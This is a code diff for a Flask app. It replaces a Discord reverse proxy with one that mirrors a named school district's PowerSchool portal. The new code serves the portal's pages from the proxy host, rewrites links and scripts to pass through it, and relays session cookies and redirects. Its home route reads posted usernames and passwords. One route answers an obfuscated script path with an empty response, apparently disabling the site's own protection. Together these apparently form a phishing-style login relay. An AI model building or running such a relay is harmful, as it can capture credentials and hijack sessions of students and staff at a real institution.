@@ -1,91 +1,129 @@
-#!/usr/bin/env python3
-import os
+from flask import Flask, render_template, request, redirect, url_for, Response
 import requests
-from flask import Flask, request, Response, redirect
-import json
+import re
 
 app = Flask(__name__)
+
+BASE_URL = "https://beaufortsc.powerschool.com"
 session = requests.Session()
 
-@app.route('/gateway', methods=['GET', 'OPTIONS'])
-@app.route('/gateway/', methods=['GET', 'OPTIONS'])
-@app.route('/api/gateway', methods=['GET', 'OPTIONS'])
-@app.route('/api/gateway/', methods=['GET', 'OPTIONS'])
-def gateway():
-    if request.method == 'OPTIONS':
-        return Response('', status=200, headers={
-            'Access-Control-Allow-Origin': '*',
-            'Access-Control-Allow-Headers': '*',
-            'Access-Control-Allow-Methods': '*'
-        })
-    qs = request.query_string.decode('utf-8')
-    url = f'wss://gateway.discord.gg/?{qs}' if qs else 'wss://gateway.discord.gg/?v=9&encoding=json'
-    return Response(json.dumps({'url': url}), status=200, headers={
-        'Content-Type': 'application/json',
-        'Access-Control-Allow-Origin': '*'
-    })
+def replace_urls(html_content):
+    pattern = r'(href|src|action)="(/[^"]*)"'
+    html_content = re.sub(pattern, r'\1="/proxy\2"', html_content)
+    pattern_single = r"(href|src|action)='(/[^']*)'"
+    html_content = re.sub(pattern_single, r"\1='/proxy\2'", html_content)
+    return html_content
 
-@app.route('/', defaults={'path': ''})
-@app.route('/<path:path>')
-def proxy(path=''):
-    if path in ['gateway', 'gateway/'] or path.startswith('api/gateway'):
-        return Response('Route conflict', status=500)
-    if not path:
-        return redirect('/login')
+@app.route('/', methods=['GET', 'POST'])
+def home():
+    if request.method == 'POST':
+        username = request.form.get('username')
+        password = request.form.get('password')
+        return redirect(url_for('home'))
+    
+    response = session.get(f"{BASE_URL}/public/home.html", cookies=request.cookies)
+    html_content = response.text
+    
+    html_content = replace_urls(html_content)
+    
+    resp = Response(html_content, content_type='text/html')
+    for cookie in response.cookies:
+        resp.set_cookie(cookie.name, cookie.value, expires=cookie.expires, path=cookie.path, domain=cookie.domain, secure=cookie.secure)
+    return resp
 
-    if path.startswith('api/'):
-        target = f'https://discord.com/api/{path[4:]}'
-    elif path.startswith('cdn/'):
-        target = f'https://cdn.discordapp.com/{path[4:]}'
-    else:
-        target = f'https://discord.com/{path}'
-
+@app.route('/proxy/<path:path>', methods=['GET', 'POST'])
+def proxy(path):
+    url = f"{BASE_URL}/{path}"
     if request.query_string:
-        target += '?' + request.query_string.decode('utf-8')
+        qs = request.query_string.decode('utf-8', errors='ignore')
+        url = f"{url}?{qs}"
+    # Build headers from incoming request, preserve everything the remote server expects
+    headers = {k: v for k, v in request.headers.items()}
+    # Ensure Host matches the upstream host
+    headers['Host'] = 'beaufortsc.powerschool.com'
+    # Override Referer to point at the original site so upstream sees correct origin
+    headers['Referer'] = f"{BASE_URL}/{path}"
+    # Remove headers that would confuse requests lib (requests will set them appropriately)
+    headers.pop('Content-Length', None)
+    headers.pop('Cookie', None)
+    if request.method == 'POST':
+        response = session.request('POST', url, data=request.form or None, files=request.files or None, cookies=request.cookies, headers=headers)
+    else:
+        response = session.request('GET', url, cookies=request.cookies, headers=headers)
+    
+    content = response.content
+    content_type = response.headers.get('content-type', '').lower()
+    
+    if 'text/html' in content_type:
+        html_content = content.decode('utf-8', errors='replace')
+        html_content = replace_urls(html_content)
+        content = html_content.encode('utf-8')
+    elif 'javascript' in content_type:
+        js_content = content.decode('utf-8', errors='replace')
+        js_content = js_content.replace(BASE_URL, f"{request.host_url}proxy")
+        content = js_content.encode('utf-8')
+    
+    resp = Response(content, content_type=response.headers.get('content-type', 'text/plain'))
+    for cookie in response.cookies:
+        resp.set_cookie(cookie.name, cookie.value, expires=cookie.expires, path=cookie.path, domain=cookie.domain, secure=cookie.secure)
+    if 'location' in response.headers:
+        location = response.headers['location']
+        if location.startswith(BASE_URL):
+            location = location[len(BASE_URL):]
+            resp.headers['location'] = f'/proxy{location}'
+        elif location.startswith('/'):
+            resp.headers['location'] = f'/proxy{location}'
+    return resp
 
-    headers = {}
-    for key, value in request.headers:
-        if key.lower() not in ['host', 'content-length', 'connection']:
-            headers[key] = value
+@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'])
+def catch_all(path):
+    if path == "eade-to-the-call-make-to-looken-the-good-What-ge":
+        return Response("", content_type="application/javascript")
 
-    headers.pop('Accept-Encoding', None)
-    headers['Host'] = target.split('/')[2]
-    headers['Origin'] = 'https://discord.com'
-    headers['Referer'] = 'https://discord.com'
+    url = f"{BASE_URL}/{path}"
+    if request.query_string:
+        qs = request.query_string.decode('utf-8', errors='ignore')
+        url = f"{url}?{qs}"
+    headers = {k: v for k, v in request.headers.items()}
+    headers['Host'] = 'beaufortsc.powerschool.com'
+    headers['Referer'] = f"{BASE_URL}/{path}"
+    headers.pop('Content-Length', None)
+    headers.pop('Cookie', None)
 
-    try:
-        resp = session.request(
-            method=request.method,
-            url=target,
-            headers=headers,
-            data=request.get_data(),
-            allow_redirects=False,
-            verify=True,
-            timeout=30
-        )
-        content = resp.content
-        content_type = resp.headers.get('Content-Type', '')
+    if request.method == 'POST':
+        if request.files:
+            response = session.request('POST', url, data=request.form or None, files=request.files or None, cookies=request.cookies, headers=headers)
+        else:
+            body = request.get_data()
+            response = session.request('POST', url, data=body, cookies=request.cookies, headers=headers)
+    else:
+        response = session.request('GET', url, cookies=request.cookies, headers=headers)
 
-        if content and ('text/html' in content_type or 'javascript' in content_type):
-            try:
-                text = content.decode('utf-8', errors='ignore')
-                text = text.replace('https://discord.com', f'http://{request.host}')
-                text = text.replace('https://cdn.discordapp.com', f'http://{request.host}/cdn')
-                text = text.replace('"/api/', f'"http://{request.host}/api/')
-                content = text.encode('utf-8')
-            except:
-                pass
+    content = response.content
+    content_type = response.headers.get('content-type', '').lower()
 
-        response_headers = {}
-        for key, value in resp.headers.items():
-            if key.lower() not in ['content-encoding', 'content-length', 'transfer-encoding', 'connection']:
-                response_headers[key] = value
+    if 'text/html' in content_type:
+        html_content = content.decode('utf-8', errors='replace')
+        html_content = replace_urls(html_content)
+        content = html_content.encode('utf-8')
+    elif 'javascript' in content_type:
+        js_content = content.decode('utf-8', errors='replace')
+        js_content = js_content.replace(BASE_URL, f"{request.host_url}proxy")
+        content = js_content.encode('utf-8')
 
-        response_headers['Access-Control-Allow-Origin'] = '*'
-        return Response(content, status=resp.status_code, headers=response_headers)
+    resp = Response(content, content_type=response.headers.get('content-type', 'text/plain'))
+    for cookie in response.cookies:
+        resp.set_cookie(cookie.name, cookie.value, expires=cookie.expires, path=cookie.path, domain=cookie.domain, secure=cookie.secure)
 
-    except Exception as e:
-        return Response(f"Error: {str(e)}", status=502)
+    if 'location' in response.headers:
+        location = response.headers['location']
+        if location.startswith(BASE_URL):
+            location = location[len(BASE_URL):]
+            resp.headers['location'] = f'/proxy{location}'
+        elif location.startswith('/'):
+            resp.headers['location'] = f'/proxy{location}'
+
+    return resp
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8000)))
+    app.run(debug=True, threaded=True)
